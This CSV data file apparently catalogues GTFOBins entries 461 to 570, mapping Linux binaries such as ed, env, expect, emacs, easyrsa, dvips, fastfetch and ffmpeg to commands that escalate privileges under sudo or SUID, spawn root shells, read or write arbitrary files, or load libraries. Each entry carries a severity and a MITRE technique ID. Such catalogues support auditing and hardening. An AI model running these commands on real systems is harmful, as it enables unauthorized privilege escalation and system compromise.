461,Linux,dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit cat /path/to/OUTPUT,Abuse the 'dosbox' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is copied to a readable location.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dosbox/
462,Linux,"dosbox -c 'mount c /' -c ""echo DATA >c:\path\to\output"" -c exit","Abuse the 'dosbox' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/dosbox/
463,Linux,"dosbox -c 'mount c /' -c ""echo DATA >c:\path\to\output"" -c exit","Abuse the 'dosbox' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/dosbox/
464,Linux,"dosbox -c 'mount c /' -c ""echo DATA >c:\path\to\output"" -c exit","Abuse the 'dosbox' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/dosbox/
465,Linux,"dotnet fsi System.IO.File.ReadAllText(""/path/to/input-file"");;",Abuse the 'dotnet' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dotnet/
466,Linux,"dotnet fsi System.IO.File.ReadAllText(""/path/to/input-file"");;",Abuse the 'dotnet' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dotnet/
467,Linux,"dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",Abuse the 'dotnet' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dotnet/
468,Linux,"dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",Abuse the 'dotnet' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dotnet/
469,Linux,dpkg -l,Abuse the 'dpkg' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dpkg/
470,Linux,dpkg -l,Abuse the 'dpkg' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dpkg/
471,Linux,dpkg -l,Abuse the 'dpkg' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/dpkg/
472,Linux,dpkg -i x_1.0_all.deb,Abuse the 'dpkg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dpkg/
473,Linux,dstat --xxx,"Abuse the 'dstat' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. `dstat` allows you to run arbitrary Python scripts loaded as ""external plugins"" if they are located in one of the directories, stated in the `dstat` man page under ""FILES"": - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/` Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dstat/
474,Linux,dstat --xxx,"Abuse the 'dstat' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. `dstat` allows you to run arbitrary Python scripts loaded as ""external plugins"" if they are located in one of the directories, stated in the `dstat` man page under ""FILES"": - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/` Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/dstat/
475,Linux,dvips -R0 texput.dvi,"Abuse the 'dvips' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target. ``` tex '\special{psfile=""`/bin/sh 1>&0""}\end' ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dvips/
476,Linux,dvips -R0 texput.dvi,"Abuse the 'dvips' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target. ``` tex '\special{psfile=""`/bin/sh 1>&0""}\end' ```",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/dvips/
477,Linux,dvips -R0 texput.dvi,"Abuse the 'dvips' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target. ``` tex '\special{psfile=""`/bin/sh 1>&0""}\end' ```",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dvips/
478,Linux,echo '...' >setup.py easy_install .,"Abuse the 'easy_install' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(""exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty"")' >setup.py ```",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/easy_install/
479,Linux,echo '...' >setup.py easy_install .,"Abuse the 'easy_install' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(""exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty"")' >setup.py ```",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/easy_install/
480,Linux,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file easyrsa --vars=/path/to/temp-file","Abuse the 'easyrsa' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/easyrsa/
481,Linux,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file easyrsa --vars=/path/to/temp-file","Abuse the 'easyrsa' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/easyrsa/
482,Linux,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file easyrsa --vars=/path/to/temp-file","Abuse the 'easyrsa' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/easyrsa/
483,Linux,eb logs,Abuse the 'eb' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/eb/
484,Linux,eb logs,Abuse the 'eb' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/eb/
485,Linux,"ed /path/to/input-file ,p q",Abuse the 'ed' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ed/
486,Linux,"ed /path/to/input-file ,p q",Abuse the 'ed' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ed/
487,Linux,"ed /path/to/input-file ,p q",Abuse the 'ed' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ed/
488,Linux,ed /path/to/output-file a DATA . w q,Abuse the 'ed' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ed/
489,Linux,ed /path/to/output-file a DATA . w q,Abuse the 'ed' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ed/
490,Linux,ed /path/to/output-file a DATA . w q,Abuse the 'ed' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/ed/
491,Linux,ed !/bin/sh q,Abuse the 'ed' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ed/
492,Linux,ed !/bin/sh q,Abuse the 'ed' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ed/
493,Linux,ed !/bin/sh q,Abuse the 'ed' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ed/
494,Linux,efax -d /path/to/input-file,Abuse the 'efax' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is actually parsed by the command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/efax/
495,Linux,efax -d /path/to/input-file,Abuse the 'efax' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The content is actually parsed by the command.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/efax/
496,Linux,grep '' /path/to/input-file,Abuse the 'egrep' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/egrep/
497,Linux,grep '' /path/to/input-file,Abuse the 'egrep' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/egrep/
498,Linux,grep '' /path/to/input-file,Abuse the 'egrep' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/egrep/
499,Linux,elvish -c 'print (slurp </path/to/input-file)',Abuse the 'elvish' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/elvish/
500,Linux,elvish -c 'print (slurp </path/to/input-file)',Abuse the 'elvish' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/elvish/
501,Linux,elvish -c 'print (slurp </path/to/input-file)',Abuse the 'elvish' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/elvish/
502,Linux,elvish -c 'print DATA >/path/to/output-file',Abuse the 'elvish' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/elvish/
503,Linux,elvish -c 'print DATA >/path/to/output-file',Abuse the 'elvish' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/elvish/
504,Linux,elvish -c 'print DATA >/path/to/output-file',Abuse the 'elvish' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/elvish/
505,Linux,elvish,Abuse the 'elvish' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/elvish/
506,Linux,elvish,Abuse the 'elvish' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/elvish/
507,Linux,elvish,Abuse the 'elvish' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/elvish/
508,Linux,emacs /path/to/input-file,Abuse the 'emacs' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/emacs/
509,Linux,emacs /path/to/input-file,Abuse the 'emacs' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/emacs/
510,Linux,emacs /path/to/output-file DATA C-x C-s,Abuse the 'emacs' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/emacs/
511,Linux,emacs /path/to/output-file DATA C-x C-s,Abuse the 'emacs' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/emacs/
512,Linux,"emacs -Q -nw --eval '(term ""/bin/sh"")'",Abuse the 'emacs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/emacs/
513,Linux,"emacs -Q -nw --eval '(term ""/bin/sh"")'",Abuse the 'emacs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/emacs/
514,Linux,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',Abuse the 'enscript' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/enscript/
515,Linux,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',Abuse the 'enscript' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/enscript/
516,Linux,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',Abuse the 'enscript' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/enscript/
517,Linux,env /bin/sh,Abuse the 'env' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/env/
518,Linux,env /bin/sh -p,Abuse the 'env' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/env/
519,Linux,env /bin/sh,Abuse the 'env' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/env/
520,Linux,eqn /path/to/input-file,Abuse the 'eqn' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/eqn/
521,Linux,eqn /path/to/input-file,Abuse the 'eqn' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/eqn/
522,Linux,eqn /path/to/input-file,Abuse the 'eqn' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/eqn/
523,Linux,espeak -qXf /path/to/input-file,Abuse the 'espeak' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content appears in the middle of other textual information as phonemes.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/espeak/
524,Linux,espeak -qXf /path/to/input-file,Abuse the 'espeak' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content appears in the middle of other textual information as phonemes.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/espeak/
525,Linux,espeak -qXf /path/to/input-file,Abuse the 'espeak' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content appears in the middle of other textual information as phonemes.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/espeak/
526,Linux,ex,Abuse the 'ex' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ex/
527,Linux,ex,Abuse the 'ex' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ex/
528,Linux,ex,Abuse the 'ex' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/ex/
529,Linux,ex -c ':!/bin/sh',Abuse the 'ex' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ex/
530,Linux,ex -c ':!/bin/sh',Abuse the 'ex' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ex/
531,Linux,ex -c ':!/bin/sh',Abuse the 'ex' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ex/
532,Linux,exiftool -filename=/path/to/output-file /path/to/input-file cat /path/to/output-file,"Abuse the 'exiftool' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. If the permissions allow it, files are moved (instead of copied) to the destination.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
533,Linux,exiftool -filename=/path/to/output-file /path/to/input-file cat /path/to/output-file,"Abuse the 'exiftool' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. If the permissions allow it, files are moved (instead of copied) to the destination.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/exiftool/
534,Linux,exiftool -filename=/path/to/output-file /path/to/input-file,"Abuse the 'exiftool' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. If the permissions allow it, files are moved (instead of copied) to the destination.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
535,Linux,exiftool -filename=/path/to/output-file /path/to/input-file,"Abuse the 'exiftool' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. If the permissions allow it, files are moved (instead of copied) to the destination.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/exiftool/
536,Linux,"exiftool ""-description<=/path/to/input-file --filename /path/to/output-file","Abuse the 'exiftool' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The output file must exists, either empty or be a supported image file. The content is written amidst other content.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
537,Linux,"exiftool ""-description<=/path/to/input-file --filename /path/to/output-file","Abuse the 'exiftool' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The output file must exists, either empty or be a supported image file. The content is written amidst other content.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/exiftool/
538,Linux,"exiftool ""-description=DATA --filename /path/to/output-file","Abuse the 'exiftool' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The output file must exists, either empty or be a supported image file. The content is written amidst other content.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
539,Linux,"exiftool ""-description=DATA --filename /path/to/output-file","Abuse the 'exiftool' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The output file must exists, either empty or be a supported image file. The content is written amidst other content.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/exiftool/
540,Linux,exiftool -description -W /path/to/output-file --filename /path/to/input-file,Abuse the 'exiftool' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Writes the metadata tags of the input file in textual format to the output.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
541,Linux,exiftool -description -W /path/to/output-file --filename /path/to/input-file,Abuse the 'exiftool' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Writes the metadata tags of the input file in textual format to the output.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/exiftool/
542,Linux,exiftool -if '...' /etc/passwd,Abuse the 'exiftool' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/exiftool/
543,Linux,exiftool -if '...' /etc/passwd,Abuse the 'exiftool' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/exiftool/
544,Linux,expand /path/to/input-file,Abuse the 'expand' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing tabs with spaces.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/expand/
545,Linux,expand /path/to/input-file,Abuse the 'expand' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing tabs with spaces.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/expand/
546,Linux,expand /path/to/input-file,Abuse the 'expand' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by replacing tabs with spaces.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/expand/
547,Linux,expect /path/to/input-file,"Abuse the 'expect' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/expect/
548,Linux,expect /path/to/input-file,"Abuse the 'expect' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/expect/
549,Linux,expect /path/to/input-file,"Abuse the 'expect' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/expect/
550,Linux,expect -c 'spawn /bin/sh;interact',Abuse the 'expect' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/expect/
551,Linux,expect -c 'spawn /bin/sh -p;interact',Abuse the 'expect' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/expect/
552,Linux,expect -c 'spawn /bin/sh;interact',Abuse the 'expect' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/expect/
553,Linux,FACTERLIB=/path/to/dir/ facter,Abuse the 'facter' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. The first `.rb` file in the `/path/to/dir/` directory will be executed.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/facter/
554,Linux,FACTERLIB=/path/to/dir/ facter,Abuse the 'facter' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. The first `.rb` file in the `/path/to/dir/` directory will be executed.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/facter/
555,Linux,facter --custom-dir=/path/to/dir/ x,Abuse the 'facter' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. The first `.rb` file in the `/path/to/dir/` directory will be executed.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/facter/
556,Linux,facter --custom-dir=/path/to/dir/ x,Abuse the 'facter' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. The first `.rb` file in the `/path/to/dir/` directory will be executed.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/facter/
557,Linux,fail2ban-client add x fail2ban-client set x addaction x fail2ban-client set x action x actionban /path/to/command fail2ban-client start x fail2ban-client set x banip 999.999.999.999 fail2ban-client set x unbanip 999.999.999.999 fail2ban-client stop x,"Abuse the 'fail2ban-client' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fail2ban-client/
558,Linux,cat >/path/to/temp-dir/fail2ban.conf <<EOF [Definition] EOF cat >/path/to/temp-dir/jail.local <<EOF [x] enabled = true action = x EOF mkdir -p /path/to/temp-dir/action.d/ cat >/path/to/temp-dir/action.d/x.conf <<EOF [Definition] actionstart = /path/to/command EOF mkdir -p /path/to/temp-dir/filter.d/ cat >/path/to/temp-dir/filter.d/x.conf <<EOF [Definition] EOF fail2ban-client -c /path/to/temp-dir/ -v restart,Abuse the 'fail2ban-client' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fail2ban-client/
559,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fastfetch/
560,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/fastfetch/
561,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/fastfetch/
562,Linux,fastfetch --file /path/to/input-file,Abuse the 'fastfetch' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is used as the logo while some other information is displayed on its right.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/fastfetch/
563,Linux,fastfetch --file /path/to/input-file,Abuse the 'fastfetch' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is used as the logo while some other information is displayed on its right.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/fastfetch/
564,Linux,fastfetch --file /path/to/input-file,Abuse the 'fastfetch' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is used as the logo while some other information is displayed on its right.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/fastfetch/
565,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /bin/sh 1>&0 2>&0""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fastfetch/
566,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /bin/sh 1>&0 2>&0""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/fastfetch/
567,Linux,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /bin/sh 1>&0 2>&0""}]}' >/path/to/temp-file.jsonc fastfetch -c /path/to/temp-file.jsonc",Abuse the 'fastfetch' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/fastfetch/
568,Linux,ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav reset^J,Abuse the 'ffmpeg' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ffmpeg/
569,Linux,ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav reset^J,Abuse the 'ffmpeg' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ffmpeg/
570,Linux,ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav reset^J,Abuse the 'ffmpeg' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/ffmpeg/
